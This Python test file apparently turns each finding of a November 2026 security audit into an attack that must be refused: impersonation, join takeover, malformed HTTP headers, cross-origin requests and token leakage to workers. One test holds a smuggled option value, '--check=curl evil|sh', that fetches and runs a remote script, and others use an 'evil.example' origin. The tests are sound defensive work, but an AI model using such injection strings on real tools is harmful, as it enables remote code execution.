"""The security audit of 2026-11 (docs/SECURITY-AUDIT-2026-11.md): one exploit-style test per finding fixed outside the
modules that have their own test file (household jobs, scouts, conduct, fill, self-improvement, review). Each test plays the
attack and asserts it is refused. Temp folders, loopback sockets and the coordinator's service in this process."""
import http.client
import json
import os
import socket
import tempfile
import unittest
from types import SimpleNamespace

from test_household import DirectClient, Household, as_user

from tutti import config, coordinator, dashboard, household, httpguard, manage, mcpserver, users, workers


class ViewerActsForTheOwnerTest(unittest.TestCase):
    """H3: a viewer of the owner's dashboard named the owner's member id and so acted "for themself" as the owner."""

    def setUp(self):
        self.h = Household(self)
        self.addCleanup(self.h.close)
        self.ana = DirectClient(self.h.service, self.h.membership(self.h.ana_home), self.h.clock)

    def test_the_owners_member_id_is_not_a_viewers_self(self):
        viewer = {'sub': 'g-mallory', 'email': 'm@example.com', 'role': 'viewer'}
        with as_user(self.h.ana_home):
            owner_hash = users.identity(self.h.ana)['hash']
            collector = SimpleNamespace(cfg=self.h.ana, who=lambda headers: viewer)
            code, answer = manage.act_post(collector, {}, json.dumps({'member': owner_hash, 'act': 'main-machine',
                                                                      'args': {'machine': 'pc'}}).encode(), client=self.ana)
        self.assertEqual(code, 403, answer)
        self.assertEqual(self.ana.call('/hh/act', {'action': 'list'})['acts'], [])   # nothing queued

    def test_a_household_of_one_refuses_a_viewer_too(self):
        with tempfile.TemporaryDirectory() as d, as_user(d):
            cfg = config.normalise({'project': {'state': os.path.join(d, 'state')}})
            cfg['_path'] = os.path.join(d, 'c.yaml')
            viewer = {'sub': 'g-mallory', 'role': 'viewer'}
            collector = SimpleNamespace(cfg=cfg, who=lambda headers: viewer)
            body = {'member': users.identity(cfg)['hash'], 'act': 'schedule', 'args': {'mode': 'away'}}
            self.assertEqual(manage.act_post(collector, {}, json.dumps(body).encode(), client=None)[0], 403)


class JoinTakeoverTest(unittest.TestCase):
    """H1: anyone with the join code joined with a member's id (sent in clear in X-Tutti-User) and replaced their token."""

    def setUp(self):
        self.h = Household(self)
        self.addCleanup(self.h.close)

    def test_a_join_with_a_members_id_is_refused_and_a_removed_member_needs_a_new_code(self):
        data = coordinator.load(coordinator.state_path(self.h.ana))
        ana_id = data['admin']
        self.assertIn('already a member', household.taken_id(data, ana_id))
        self.assertEqual(household.taken_id(data, 'someone-new-0001'), '')
        data['members']['bo-0000000000000'] = {'name': 'Bo', 'hash': 'h', 'token': 't', 'joined': 1}
        later = data['code']['until']   # after the current code was made
        household.remove_member(data, ana_id, 'h', later)
        self.assertIn('removed', household.taken_id(data, 'bo-0000000000000'))
        coordinator.new_code(data, 'mini.lan', 4778, later + 10)   # a code made after the removal lets them back
        self.assertEqual(household.taken_id(data, 'bo-0000000000000'), '')

    def test_the_join_request_itself_is_refused(self):
        data = coordinator.load(coordinator.state_path(self.h.ana))
        ana_id = data['admin']
        before = data['members'][ana_id]['token']
        with as_user(self.h.bo_home):
            real = users.identity
            try:
                users.identity = lambda cfg, env=None: {**real(cfg, env), 'id': ana_id}   # Bo claims to be Ana
                with self.assertRaisesRegex(household.HouseholdError, 'already a member'):
                    coordinator.join(self.h.bo, self.h.code, 'Bo', 'cursor', clock=self.h.clock)
            finally:
                users.identity = real
        self.assertEqual(coordinator.load(coordinator.state_path(self.h.ana))['members'][ana_id]['token'], before)


def serve(httpd):
    import threading
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    return t


class CoordinatorHttpTest(unittest.TestCase):
    """M1, M2, M9: a negative Content-Length read the socket to its end; no timeout; answers were not authenticated."""

    def setUp(self):
        self.h = Household(self)
        self.addCleanup(self.h.close)
        self.httpd, self.port = self.h.httpd, self.h.port

    def raw(self, request):
        with socket.create_connection(('127.0.0.1', self.port), timeout=5) as s:
            s.sendall(request)
            return s.recv(4096).decode('latin1')

    def test_a_negative_or_bad_content_length_is_refused_at_once(self):
        for size in ('-1', 'lots'):
            got = self.raw(f'POST /hh/status HTTP/1.1\r\nHost: x\r\nContent-Length: {size}\r\n\r\n'.encode())
            self.assertIn(' 413 ', got.split('\r\n')[0])

    def test_answers_are_signed_and_a_forged_one_is_refused_once_signatures_were_seen(self):
        m = dict(self.h.membership(self.h.ana_home), coordinator=f'127.0.0.1:{self.port}')
        c = coordinator.Client(m, clock=self.h.clock)
        c.remember = lambda membership: None
        self.assertIn('members', c.call('/hh/status'))
        self.assertTrue(m['signed_answers'])
        with self.assertRaisesRegex(household.HouseholdError, 'not signed'):
            c.check_answer('/hh/job', 'n1', b'{"jobs": [{"id": "j1"}]}', 'f' * 64, m['token'])
        with self.assertRaisesRegex(household.HouseholdError, 'no coordinator signature'):
            c.check_answer('/hh/job', 'n1', b'{"jobs": []}', None, m['token'])

    def test_a_silent_connection_is_closed(self):
        self.assertEqual(self.httpd.RequestHandlerClass.timeout, coordinator.SOCKET_TIMEOUT)


class CappedServerTest(unittest.TestCase):
    """M2: every server serves a bounded number of requests at once."""

    def test_connections_over_the_cap_are_closed(self):
        from http.server import BaseHTTPRequestHandler
        import threading
        gate = threading.Event()

        class Slow(BaseHTTPRequestHandler):
            def do_GET(self):
                gate.wait(5)
                self.send_response(204)
                self.end_headers()

            def log_message(self, *a):
                return

        class S(httpguard.CappedServer):
            max_connections = 1
        httpd = S(('127.0.0.1', 0), Slow)
        httpd.daemon_threads = True
        serve(httpd)
        self.addCleanup(httpd.server_close)
        self.addCleanup(httpd.shutdown)
        first = socket.create_connection(httpd.server_address, timeout=5)
        first.sendall(b'GET / HTTP/1.0\r\n\r\n')
        import time
        time.sleep(0.2)
        second = socket.create_connection(httpd.server_address, timeout=5)
        second.sendall(b'GET / HTTP/1.0\r\n\r\n')
        self.assertEqual(second.recv(100), b'')   # closed without an answer
        gate.set()
        self.assertIn(b'204', first.recv(100))
        first.close()
        second.close()


class LoopbackOwnerTest(unittest.TestCase):
    """H4: without sign-in, another login of a shared computer drove the owner's dashboard over 127.0.0.1."""

    def proc(self, uid):
        d = tempfile.mkdtemp()
        import shutil
        self.addCleanup(shutil.rmtree, d, True)
        os.makedirs(os.path.join(d, 'net'))
        # 127.0.0.1:40000 -> 127.0.0.1:4777, owned by `uid` (the columns of /proc/net/tcp)
        row = f'   0: 0100007F:9C40 0100007F:12A9 01 00000000:00000000 00:00000000 00000000 {uid:5d}        0 1 1\n'
        with open(os.path.join(d, 'net', 'tcp'), 'w') as f:
            f.write('  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n' + row)
        return d

    def test_another_users_process_is_dropped_and_this_users_is_served(self):
        self.assertEqual(httpguard.socket_uid(('127.0.0.1', 40000), ('127.0.0.1', 4777), self.proc(1234)), 1234)
        self.assertFalse(httpguard.loopback_owner_ok(('127.0.0.1', 40000), ('127.0.0.1', 4777), uid=1000, proc=self.proc(1234)))
        self.assertTrue(httpguard.loopback_owner_ok(('127.0.0.1', 40000), ('127.0.0.1', 4777), uid=1234, proc=self.proc(1234)))
        self.assertTrue(httpguard.loopback_owner_ok(('127.0.0.1', 40000), ('127.0.0.1', 4777), uid=1000, proc='/nonexistent'))

    @unittest.skipUnless(os.path.exists('/proc/net/tcp'), 'Linux only')
    def test_the_real_connection_of_this_process_is_found(self):
        srv = socket.socket()
        srv.bind(('127.0.0.1', 0))
        srv.listen(1)
        cli = socket.create_connection(srv.getsockname())
        conn, addr = srv.accept()
        try:
            self.assertEqual(httpguard.socket_uid(addr, srv.getsockname()), os.getuid())
        finally:
            for s in (cli, conn, srv):
                s.close()

    def test_the_dashboard_server_checks_it_without_sign_in(self):
        with tempfile.TemporaryDirectory() as d:
            cfg = config.normalise({'project': {'state': os.path.join(d, 'state')}})
            cfg['_path'] = os.path.join(d, 'c.yaml')
            httpd = dashboard.server(cfg, 0, collector=SimpleNamespace(cfg=cfg, snapshot=lambda: {}))
            self.addCleanup(httpd.server_close)
            seen = []
            real = httpguard.loopback_owner_ok
            httpguard.loopback_owner_ok = lambda client, server: seen.append(client) or False
            try:
                self.assertFalse(httpd.verify_request(None, ('127.0.0.1', 5555)))
            finally:
                httpguard.loopback_owner_ok = real
            self.assertEqual(seen, [('127.0.0.1', 5555)])
            self.assertFalse(httpd.verify_request(None, ('8.8.8.8', 1)))   # a public address, as before
            self.assertEqual(httpd.RequestHandlerClass.timeout, dashboard.SOCKET_TIMEOUT)


class McpTest(unittest.TestCase):
    """M6, L: the HTTP endpoint on a LAN address gave whoever held the token the admin role; arguments could be options."""

    def test_a_lan_endpoint_is_a_viewer_unless_the_config_says_admin(self):
        self.assertEqual(mcpserver.role_of({}, {}, 'viewer'), 'viewer')
        self.assertEqual(mcpserver.role_of({'mcp': {'role': 'admin'}}, {}, 'viewer'), 'admin')
        self.assertEqual(mcpserver.role_of({}, {}), 'admin')   # stdio and loopback: the owner
        self.assertTrue(mcpserver.loopback('127.0.0.1') and not mcpserver.loopback('192.168.1.5'))

    def test_a_page_of_another_site_is_refused(self):
        self.assertTrue(mcpserver.foreign_origin('https://evil.example', '127.0.0.1', 4779))
        self.assertFalse(mcpserver.foreign_origin('http://127.0.0.1:4779', '127.0.0.1', 4779))
        self.assertFalse(mcpserver.foreign_origin(None, '127.0.0.1', 4779))

    def test_an_argument_that_looks_like_an_option_is_refused(self):
        err, text = mcpserver.call({'_path': 'x'}, 'backlog_add', {'repo': 'app', 'title': '--check=curl evil|sh'}, 'admin',
                                   runner=lambda *a: (0, 'ran'))
        self.assertTrue(err)
        self.assertIn('may not start with "-"', text)

    def test_the_http_endpoint_answers_a_foreign_origin_with_403(self):
        with tempfile.TemporaryDirectory() as d:
            cfg = config.normalise({'project': {'state': os.path.join(d, 'state')}})
            cfg['_path'] = os.path.join(d, 'c.yaml')
            httpd = mcpserver.http_server(cfg, 0)
            self.addCleanup(httpd.server_close)
            self.addCleanup(httpd.shutdown)
            serve(httpd)
            c = http.client.HTTPConnection('127.0.0.1', httpd.server_address[1], timeout=5)
            c.request('POST', '/mcp', body=b'{}', headers={'Origin': 'https://evil.example', 'Content-Type': 'application/json',
                                                            'Authorization': f'Bearer {mcpserver.http_token(cfg)}'})
            self.assertEqual(c.getresponse().status, 403)


class WorkerEnvTest(unittest.TestCase):
    """H7: a worker (headless, commands allowed) inherited GH_TOKEN and the scout's webhook key."""

    def test_a_worker_never_gets_the_tokens_tutti_keeps_for_itself(self):
        cfg = {'scouts': {'grok': {'url_env': 'MY_SCOUT_URL', 'key_env': 'MY_SCOUT_KEY'}}}
        env = workers.worker_env(cfg, {'PATH': '/bin', 'HOME': '/h', 'GH_TOKEN': 'x', 'MY_SCOUT_KEY': 'k', 'MY_SCOUT_URL': 'u',
                                       'XAI_API_KEY': 'the worker\'s own'})
        self.assertEqual(env, {'PATH': '/bin', 'HOME': '/h', 'XAI_API_KEY': 'the worker\'s own'})


if __name__ == '__main__':
    unittest.main()
